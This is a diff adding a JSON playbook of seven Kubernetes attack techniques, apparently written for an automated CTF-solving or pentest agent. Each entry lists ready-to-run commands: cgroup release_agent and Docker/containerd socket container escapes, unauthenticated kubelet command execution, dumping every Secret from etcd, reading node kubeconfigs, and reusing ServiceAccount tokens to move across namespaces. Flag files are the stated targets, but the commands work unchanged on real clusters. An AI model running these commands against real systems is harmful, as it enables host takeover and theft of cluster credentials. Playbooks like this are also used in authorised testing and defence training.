@@ -1,0 +1,150 @@
+[
+  {
+    "id": "k8s-cgroup-release-agent",
+    "title": "Kubernetes Container Escape — cgroup release_agent Exploitation",
+    "category": "ESCAPE",
+    "subcategory": "Kubernetes",
+    "description": "When a container runs with CAP_SYS_ADMIN capability, an attacker can escape to the host by exploiting the cgroup v1 release_agent mechanism. Steps: (1) Mount cgroup filesystem: mount -t cgroup -o memory cgroup /tmp/cgrp (2) Create child cgroup: mkdir /tmp/cgrp/x (3) Enable release notification: echo 1 > /tmp/cgrp/x/notify_on_release (4) Get host path of container's overlay mount: host_path=$(sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab) (5) Write exploit command: echo '#!/bin/sh' > /tmp/exploit.sh; echo 'cat /flag* > /tmp/cgrp/output' >> /tmp/exploit.sh (6) Set release_agent to the exploit: echo '$host_path/tmp/exploit.sh' > /tmp/release_agent (7) Trigger release by killing the child cgroup: sh -c 'echo $$ > /tmp/cgrp/x/cgroup.procs'. This technique works on cgroup v1 systems. Requires CAP_SYS_ADMIN and a writable cgroup mount.",
+    "techniques": [
+      "Check capabilities: capsh --print 2>/dev/null || cat /proc/1/status | grep -i cap",
+      "Check cgroup version: ls /sys/fs/cgroup/ && mount | grep cgroup",
+      "Mount cgroup: mount -t cgroup -o memory cgroup /tmp/cgrp",
+      "Create child cgroup: mkdir /tmp/cgrp/x",
+      "Enable notification: echo 1 > /tmp/cgrp/x/notify_on_release",
+      "Get container overlay path: sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab",
+      "Write release_agent path: echo '<HOST_PATH>/tmp/exploit.sh' > /tmp/release_agent",
+      "Write exploit script: echo -e '#!/bin/sh\\ncat /flag* > /tmp/cgrp/output' > /tmp/exploit.sh; chmod +x /tmp/exploit.sh",
+      "Trigger release: sh -c 'echo $$ > /tmp/cgrp/x/cgroup.procs'",
+      "Read output: cat /tmp/cgrp/output"
+    ],
+    "tools": ["check_capabilities", "check_mounts", "shell_exec", "kubectl_exec"],
+    "tags": ["kubernetes", "container-escape", "cgroup", "release_agent", "CAP_SYS_ADMIN", "privilege-escalation"],
+    "confidence": 0.85,
+    "mitre_attack": "T1611"
+  },
+  {
+    "id": "k8s-kubelet-anonymous-api",
+    "title": "Kubernetes Kubelet Anonymous API — Pod Access and Command Execution",
+    "category": "DISCOVERY",
+    "subcategory": "Kubernetes",
+    "description": "The Kubelet API on port 10250 may be configured with anonymous authentication (--anonymous-auth=true), allowing unauthenticated access to pod information and command execution. Key endpoints: /pods (list pods), /runningpods/ (running pods with container info), /exec/ (execute commands in containers), /metrics (resource usage). After discovering node IPs (kubectl get nodes -o wide), probe each node's kubelet API. Curl with -k flag for self-signed TLS certificates.",
+    "techniques": [
+      "Discover node IPs: kubectl get nodes -o wide",
+      "Probe kubelet: curl -sk https://NODE_IP:10250/pods | head -100",
+      "List running pods: curl -sk https://NODE_IP:10250/runningpods/",
+      "Get pod details: curl -sk https://NODE_IP:10250/pods | python3 -c \"import sys,json; [print(p['metadata']['namespace'],p['metadata']['name']) for p in json.load(sys.stdin)['items']]\"",
+      "Execute command in pod: curl -sk -X POST \"https://NODE_IP:10250/exec/NAMESPACE/POD_NAME/CONTAINER_NAME\" -H \"Content-Type: application/x-www-form-urlencoded\" -d 'command=cat&command=/flag.txt&output=1&error=1'",
+      "Get kubeconfig from node: cat /etc/kubernetes/admin.conf 2>/dev/null || cat /etc/kubernetes/kubelet.conf 2>/dev/null || cat ~/.kube/config 2>/dev/null",
+      "Use discovered kubeconfig: kubectl --kubeconfig=/tmp/kubeconfig get pods -A",
+      "Read secrets with kubeconfig: kubectl --kubeconfig=/tmp/kubeconfig get secrets -A"
+    ],
+    "tools": ["kubelet_probe", "kubectl_get_pods", "kubectl_exec", "curl_get", "shell_exec"],
+    "tags": ["kubernetes", "kubelet", "anonymous-auth", "10250", "api", "discovery", "container-escape"],
+    "confidence": 0.8,
+    "mitre_attack": "T1613"
+  },
+  {
+    "id": "k8s-etcd-navigation",
+    "title": "Kubernetes etcd Direct Access — Secret Extraction from Cluster Store",
+    "category": "CREDENTIAL",
+    "subcategory": "Kubernetes",
+    "description": "etcd (port 2379) stores all Kubernetes cluster state, including Secrets in base64-encoded form. When etcd is accessible without authentication or with discovered credentials, read secrets directly from the key-value store. The key structure is /registry/secrets/<namespace>/<secret-name>. First enumerate keys with 'get / --prefix --keys-only', then read specific Secret values with 'get /registry/secrets/NAMESPACE/SECRET_NAME'. Decode base64 values with: echo 'BASE64_STRING' | base64 -d. For TLS-enabled etcd, use --cert, --key, and --cacert flags with certificates from /etc/kubernetes/pki/etcd/ on control plane nodes.",
+    "techniques": [
+      "Discover etcd: ss -tlnp | grep 2379; grep -r etcd /etc/kubernetes/ 2>/dev/null",
+      "List all keys: ETCDCTL_API=3 etcdctl --endpoints=http://localhost:11379 get / --prefix --keys-only | head -50",
+      "Filter secrets: ETCDCTL_API=3 etcdctl --endpoints=http://localhost:11379 get / --prefix --keys-only | grep secret",
+      "Read a specific secret: ETCDCTL_API=3 etcdctl --endpoints=http://localhost:11379 get /registry/secrets/NAMESPACE/SECRET_NAME -o json",
+      "Get all secrets with values: ETCDCTL_API=3 etcdctl --endpoints=http://localhost:11379 get / --prefix -o json | head -500",
+      "For TLS etcd: ETCDCTL_API=3 etcdctl --endpoints=https://IP:2379 --cacert=/etc/kubernetes/pki/etcd/ca.crt --cert=/etc/kubernetes/pki/etcd/server.crt --key=/etc/kubernetes/pki/etcd/server.key get / --prefix --keys-only",
+      "Decode base64 secret: echo 'BASE64_STRING' | base64 -d",
+      "Extract all secret values: etcdctl get /registry/secrets/ --prefix -o json | python3 -c \"import sys,json,base64; data=json.load(sys.stdin); [print(k,base64.b64decode(v).decode()) for k,v in data.items()]\""
+    ],
+    "tools": ["etcdctl_get", "shell_exec"],
+    "tags": ["kubernetes", "etcd", "secrets", "2379", "base64", "cluster-admin", "credential-access"],
+    "confidence": 0.85,
+    "mitre_attack": "T1552"
+  },
+  {
+    "id": "k8s-cri-socket-escape",
+    "title": "Kubernetes CRI Socket — Container Escape via containerd",
+    "category": "ESCAPE",
+    "subcategory": "Kubernetes",
+    "description": "When a pod mounts the containerd CRI socket (/run/containerd/containerd.sock), use the ctr CLI to interact with host containerd and launch a privileged container that mounts the host filesystem. Steps: (1) Verify socket access: ls -la /run/containerd/containerd.sock (2) Pull image: ctr --address /run/containerd/containerd.sock image pull docker.io/library/alpine:latest (3) Run privileged container: ctr --address /run/containerd/containerd.sock run --privileged --mount type=bind,src=/host-flag,dst=/mnt,options=rbind:rw docker.io/library/alpine:latest escape -- cat /mnt/flag.txt. Alternative: use crictl if available.",
+    "techniques": [
+      "Check socket: ls -la /run/containerd/containerd.sock /var/run/containerd/containerd.sock",
+      "Check ctr available: which ctr || find / -name ctr -type f 2>/dev/null",
+      "List images: ctr --address /run/containerd/containerd.sock image ls",
+      "Pull alpine: ctr --address /run/containerd/containerd.sock image pull docker.io/library/alpine:latest",
+      "Escape with bind mount: ctr --address /run/containerd/containerd.sock run --rm --privileged --mount type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/alpine:latest escape -- cat /host/flag.txt",
+      "Alternative crictl: crictl --runtime-endpoint unix:///run/containerd/containerd.sock ps -a",
+      "Check mounts: mount | grep containerd; findmnt | grep containerd"
+    ],
+    "tools": ["check_mounts", "shell_exec", "kubectl_exec"],
+    "tags": ["kubernetes", "container-escape", "containerd", "cri-socket", "ctr", "privileged"],
+    "confidence": 0.8,
+    "mitre_attack": "T1611"
+  },
+  {
+    "id": "k8s-docker-socket-escape",
+    "title": "Kubernetes Docker Socket Escape — Host Access via Docker CLI",
+    "category": "ESCAPE",
+    "subcategory": "Kubernetes",
+    "description": "When a pod mounts the Docker socket (/var/run/docker.sock), use the docker CLI to run a privileged container with host filesystem bind mount. This is the simplest container escape technique: (1) Verify docker access: docker ps (2) Run container with host mount: docker run --rm -v /:/host -it alpine chroot /host cat /flag.txt. If docker is not in the container, use curl against the Docker API directly on the Unix socket.",
+    "techniques": [
+      "Check socket: ls -la /var/run/docker.sock",
+      "Check docker: which docker && docker ps",
+      "Escape via docker: docker run --rm -v /:/host alpine cat /host/flag.txt",
+      "Escape with chroot: docker run --rm -v /:/host -it alpine chroot /host sh -c 'cat /flag* 2>/dev/null; cat /host-flag/flag.txt 2>/dev/null'",
+      "Escape with nsenter: docker run --rm --pid=host --privileged alpine nsenter --target 1 --mount cat /flag.txt",
+      "Via Docker API: curl --unix-socket /var/run/docker.sock http://localhost/containers/json",
+      "Create container via API: curl --unix-socket /var/run/docker.sock -X POST -H 'Content-Type: application/json' http://localhost/containers/create -d '{\"Image\":\"alpine\",\"Cmd\":[\"cat\",\"/flag.txt\"],\"HostConfig\":{\"Binds\":[\"/:/host:ro\"]}}'"
+    ],
+    "tools": ["check_mounts", "docker_registry", "shell_exec", "kubectl_exec"],
+    "tags": ["kubernetes", "container-escape", "docker-socket", "docker", "host-access"],
+    "confidence": 0.9,
+    "mitre_attack": "T1611"
+  },
+  {
+    "id": "k8s-hostpath-symlink-escape",
+    "title": "Kubernetes hostPath Mount — Symlink Escape to Host Filesystem",
+    "category": "ESCAPE",
+    "subcategory": "Kubernetes",
+    "description": "When a pod has a writable hostPath volume mount, create a symlink from the mounted directory to a target path on the host filesystem. The symlink follows the host's filesystem path, allowing access to files outside the intended mount. Example: if /var/log is mounted writable, 'ln -s /flag.txt /var/log/flag_link' creates a symlink accessible to the pod. This technique also enables reading other containers' files if their storage paths are known.",
+    "techniques": [
+      "Check mounts: mount | grep hostPath; findmnt | grep hostPath",
+      "List mount contents: ls -la /var/log/; ls -la /mnt/",
+      "Find host paths: kubectl get pod POD_NAME -o yaml | grep -A5 hostPath",
+      "Create symlink: ln -s /flag.txt /var/log/flag_link",
+      "Create symlink to flag dir: ln -s /host-flag /var/log/host_flag_link",
+      "Read through symlink: cat /var/log/flag_link",
+      "Read host files: cat /var/log/host_flag_link/flag.txt",
+      "Alternative: access /proc/1/root/ for host filesystem via nsenter"
+    ],
+    "tools": ["check_mounts", "shell_exec", "kubectl_exec", "kubectl_get_pods"],
+    "tags": ["kubernetes", "container-escape", "hostpath", "symlink", "volume-mount", "filesystem"],
+    "confidence": 0.75,
+    "mitre_attack": "T1611"
+  },
+  {
+    "id": "k8s-sa-token-lateral",
+    "title": "Kubernetes ServiceAccount Token — Cross-Namespace Lateral Movement",
+    "category": "LATERAL",
+    "subcategory": "Kubernetes",
+    "description": "Kubernetes ServiceAccount tokens enable API authentication. Tokens can be found in: /var/run/secrets/kubernetes.io/serviceaccount/token (mounted by default), Secrets in other namespaces (if RBAC allows reading), or leaked via environment variables. Use discovered tokens with 'kubectl --token=TOKEN' to authenticate as the associated ServiceAccount. Check token permissions with 'kubectl auth can-i --list --token TOKEN'. Cross-namespace movement is possible when a token from one namespace has permissions in another.",
+    "techniques": [
+      "Read default token: cat /var/run/secrets/kubernetes.io/serviceaccount/token",
+      "Check token namespace: kubectl --token=TOKEN auth can-i --list",
+      "List secrets across namespaces: kubectl --token=TOKEN get secrets -A",
+      "Use token with kubectl: kubectl --token=TOKEN --server=https://kubernetes.default.svc get pods",
+      "Read leaked token from env: env | grep -i token; env | grep -i sa_token",
+      "Check for mounted token secrets: ls -la /var/run/secrets/; ls -la /var/run/secrets/leaked/",
+      "Decode token payload (JWT): python3 -c \"import base64,json; t='TOKEN'; [print(json.loads(base64.b64decode(p+'==').decode())) for p in t.split('.')[:2]]\"",
+      "Use token with curl: curl -k -H \"Authorization: Bearer TOKEN\" https://kubernetes.default.svc/api/v1/namespaces/",
+      "Get CA cert: cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt"
+    ],
+    "tools": ["sa_token_read", "kubectl_auth_check", "kubectl_get_secrets", "shell_exec"],
+    "tags": ["kubernetes", "serviceaccount", "token", "lateral-movement", "rbac", "cross-namespace"],
+    "confidence": 0.8,
+    "mitre_attack": "T1528"
+  }
+]
